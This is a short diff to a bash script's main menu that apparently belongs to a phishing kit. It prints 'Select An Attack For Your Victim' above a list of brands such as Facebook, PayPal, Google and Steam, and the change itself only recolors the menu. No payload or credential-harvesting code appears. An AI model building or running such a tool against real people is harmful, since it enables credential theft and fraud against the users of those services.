@@ -903,18 +903,18 @@ main_menu() {
 	cat <<- EOF
 		${RED}Select An Attack For Your Victim:
 
-		${BRIGHT_GREEN}01. Airbnb	${BRIGHT_GREEN}11. Tiktok	${BRIGHT_GREEN}21. Roblox
-		${BRIGHT_GREEN}02. Adobe	${BRIGHT_GREEN}12. Snapchat	${BRIGHT_GREEN}22. Steam	
-		${BRIGHT_GREEN}03. Facebook	${BRIGHT_GREEN}13. Spotify	${BRIGHT_GREEN}23. Playstation
-		${BRIGHT_GREEN}04. Instagram	${BRIGHT_GREEN}14. Github	${BRIGHT_GREEN}24. Xbox
-		${BRIGHT_GREEN}05. Google	${BRIGHT_GREEN}15. Shopify	${BRIGHT_GREEN}25. Verizon
-		${BRIGHT_GREEN}06. Bitcoin	${BRIGHT_GREEN}16. Ebay	${BRIGHT_GREEN}26. Wifi
-		${BRIGHT_GREEN}07. Crypto	${BRIGHT_GREEN}17. Pinterest		
-		${BRIGHT_GREEN}08. Microsoft	${BRIGHT_GREEN}18. Discord		
-		${BRIGHT_GREEN}09. Netflix	${BRIGHT_GREEN}19. Reddit		
-		${BRIGHT_GREEN}10. Paypal	${BRIGHT_GREEN}20. Messenger		
+		${BRIGHT_BLACK}01. ${BRIGHT_CYAN}Airbnb	${BRIGHT_BLACK}11. Tiktok	${BRIGHT_BLACK}21. Roblox
+		${BRIGHT_BLACK}02. ${BRIGHT_CYAN}Adobe	${BRIGHT_BLACK}12. Snapchat	${BRIGHT_BLACK}22. Steam	
+		${BRIGHT_BLACK}03. ${BRIGHT_CYAN}Facebook	${BRIGHT_BLACK}13. Spotify	${BRIGHT_BLACK}23. Playstation
+		${BRIGHT_BLACK}04. ${BRIGHT_CYAN}Instagram	${BRIGHT_BLACK}14. Github	${BRIGHT_BLACK}24. Xbox
+		${BRIGHT_BLACK}05. ${BRIGHT_CYAN}Google	${BRIGHT_BLACK}15. Shopify	${BRIGHT_BLACK}25. Verizon
+		${BRIGHT_BLACK}06. ${BRIGHT_CYAN}Bitcoin	${BRIGHT_BLACK}16. Ebay	${BRIGHT_BLACK}26. Wifi
+		${BRIGHT_BLACK}07. ${BRIGHT_CYAN}Crypto	${BRIGHT_BLACK}17. Pinterest		
+		${BRIGHT_BLACK}08. ${BRIGHT_CYAN}Microsoft	${BRIGHT_BLACK}18. Discord		
+		${BRIGHT_BLACK}09. ${BRIGHT_CYAN}Netflix	${BRIGHT_BLACK}19. Reddit		
+		${BRIGHT_BLACK}10. ${BRIGHT_CYAN}Paypal	${BRIGHT_BLACK}20. Messenger		
 
-		${BRIGHT_CYAN}99. About         ${BRIGHT_CYAN}0. Exit
+		${BRIGHT_BLACK}99. ${BRIGHT_CYAN}About         ${BRIGHT_BLACK}0. ${BRIGHT_CYAN}Exit
 	EOF
 
 	echo
